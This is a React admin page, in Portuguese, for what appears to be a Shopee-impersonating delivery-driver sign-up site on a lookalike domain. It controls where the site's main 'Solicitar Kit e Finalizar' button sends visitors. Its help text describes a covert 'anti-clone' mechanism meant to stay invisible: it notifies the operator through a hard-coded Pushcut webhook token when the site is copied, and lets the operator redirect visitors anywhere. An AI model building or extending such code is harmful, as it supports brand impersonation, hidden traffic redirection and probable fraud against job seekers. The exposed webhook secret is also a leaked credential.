import React, { useState, useEffect } from 'react';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { useScrollTop } from '@/hooks/use-scroll-top';

const RedirectControl: React.FC = () => {
  useScrollTop();
  
  const { toast } = useToast();
  const [targetUrl, setTargetUrl] = useState('/entrega');
  const [isLoading, setIsLoading] = useState(true);
  const [isSaving, setIsSaving] = useState(false);

  // Carregar configuração atual
  useEffect(() => {
    loadConfiguration();
  }, []);

  const loadConfiguration = async () => {
    try {
      const response = await fetch('/api/admin/security-config');
      const data = await response.json();
      
      if (data.success && data.config && data.config.target_url) {
        setTargetUrl(data.config.target_url);
      }
    } catch (error) {
      console.error('Erro ao carregar configuração:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const saveConfiguration = async () => {
    setIsSaving(true);
    
    try {
      const response = await fetch('/api/admin/security-config', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          redirect_enabled: targetUrl !== '/entrega',
          target_url: targetUrl,
          legitimate_domain: 'https://shopee.cadastrodoentregador.com',
          pushcut_url: 'https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Site%20clonado%20',
          audit_mode: true
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        toast({
          title: "✅ Configuração Salva!",
          description: `Botão agora redireciona para: ${targetUrl}`,
        });
      } else {
        throw new Error(data.message || 'Erro desconhecido');
      }
    } catch (error) {
      console.error('Erro ao salvar configuração:', error);
      toast({
        title: "❌ Erro",
        description: "Não foi possível salvar a configuração",
        variant: "destructive",
      });
    } finally {
      setIsSaving(false);
    }
  };

  const testApi = async () => {
    try {
      const response = await fetch('/api/redirect-config');
      const data = await response.json();
      
      toast({
        title: "🧪 Teste da API",
        description: `API retorna: ${data.target_url}`,
      });
    } catch (error) {
      toast({
        title: "❌ Erro no teste",
        description: "Não foi possível testar a API",
        variant: "destructive",
      });
    }
  };

  const presetButtons = [
    { label: 'Normal (/entrega)', value: '/entrega' },
    { label: 'Site Original', value: 'https://shopee.cadastrodoentregador.com' },
    { label: 'Google', value: 'https://www.google.com' },
    { label: 'Outro site', value: 'https://' }
  ];

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#E83D22] mx-auto mb-4"></div>
          <p>Carregando...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-cog text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Controle de Redirecionamento</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Anti-Clone System</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto">
          
          {/* Status Atual */}
          <Card className="mb-6 overflow-hidden">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">📊 Status Atual</h3>
            </div>
            <div className="p-6">
              <div className={`p-4 rounded-lg border ${targetUrl === '/entrega' ? 'bg-green-50 border-green-200' : 'bg-orange-50 border-orange-200'}`}>
                <div className="flex items-center justify-between">
                  <div>
                    <h4 className={`font-medium ${targetUrl === '/entrega' ? 'text-green-800' : 'text-orange-800'}`}>
                      Botão "Solicitar Kit e Finalizar"
                    </h4>
                    <p className={`text-sm mt-1 ${targetUrl === '/entrega' ? 'text-green-700' : 'text-orange-700'}`}>
                      Atualmente redireciona para: <strong>{targetUrl}</strong>
                    </p>
                  </div>
                  <div className={`text-2xl ${targetUrl === '/entrega' ? 'text-green-500' : 'text-orange-500'}`}>
                    {targetUrl === '/entrega' ? '✅' : '🔄'}
                  </div>
                </div>
              </div>
            </div>
          </Card>

          {/* Configuração */}
          <Card className="mb-6 overflow-hidden">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">⚙️ Configurar Destino</h3>
            </div>
            <div className="p-6">
              
              {/* Botões Presets */}
              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Opções Rápidas:
                </label>
                <div className="grid grid-cols-2 gap-2">
                  {presetButtons.map((preset) => (
                    <Button
                      key={preset.value}
                      variant="outline"
                      size="sm"
                      onClick={() => setTargetUrl(preset.value)}
                      className={targetUrl === preset.value ? 'border-[#E83D22] bg-[#E83D22] text-white' : ''}
                    >
                      {preset.label}
                    </Button>
                  ))}
                </div>
              </div>

              {/* URL Custom */}
              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  URL de Destino:
                </label>
                <Input
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  placeholder="/entrega ou https://..."
                  className="w-full"
                />
                <p className="text-xs text-gray-500 mt-1">
                  Use /entrega para comportamento normal ou qualquer URL para redirecionamento
                </p>
              </div>
            </div>
          </Card>

          {/* Ações */}
          <div className="flex flex-col sm:flex-row gap-4 mb-6">
            <Button
              onClick={saveConfiguration}
              disabled={isSaving}
              className="flex-1 bg-[#E83D22] hover:bg-[#d73920] text-white"
            >
              {isSaving ? (
                <>
                  <i className="fas fa-spinner fa-spin mr-2"></i>
                  Salvando...
                </>
              ) : (
                <>
                  <i className="fas fa-save mr-2"></i>
                  Salvar Configuração
                </>
              )}
            </Button>
            
            <Button
              onClick={testApi}
              variant="outline"
              className="flex-1 border-[#E83D22] text-[#E83D22] hover:bg-[#E83D22] hover:text-white"
            >
              <i className="fas fa-flask mr-2"></i>
              Testar API
            </Button>
          </div>

          {/* Como Funciona */}
          <Card className="overflow-hidden">
            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
              <h3 className="font-semibold text-[#E83D22]">ℹ️ Como Funciona</h3>
            </div>
            <div className="p-6">
              <div className="space-y-3 text-sm text-gray-700">
                <div className="flex items-start">
                  <div className="text-[#E83D22] mr-2 mt-1">🔗</div>
                  <div>
                    <strong>API Discreta:</strong> O botão consulta a API <code>/api/redirect-config</code> antes de funcionar.
                  </div>
                </div>
                
                <div className="flex items-start">
                  <div className="text-[#E83D22] mr-2 mt-1">🚨</div>
                  <div>
                    <strong>Detecção de Clones:</strong> Quando alguém clona o site, você recebe uma notificação automática.
                  </div>
                </div>
                
                <div className="flex items-start">
                  <div className="text-[#E83D22] mr-2 mt-1">🎯</div>
                  <div>
                    <strong>Controle Total:</strong> Você pode redirecionar usuários de sites clonados para onde quiser.
                  </div>
                </div>
                
                <div className="flex items-start">
                  <div className="text-[#E83D22] mr-2 mt-1">👻</div>
                  <div>
                    <strong>Invisível:</strong> O clonador não percebe - parece apenas código de configuração normal.
                  </div>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
      
      <Footer />
    </div>
  );
};

export default RedirectControl;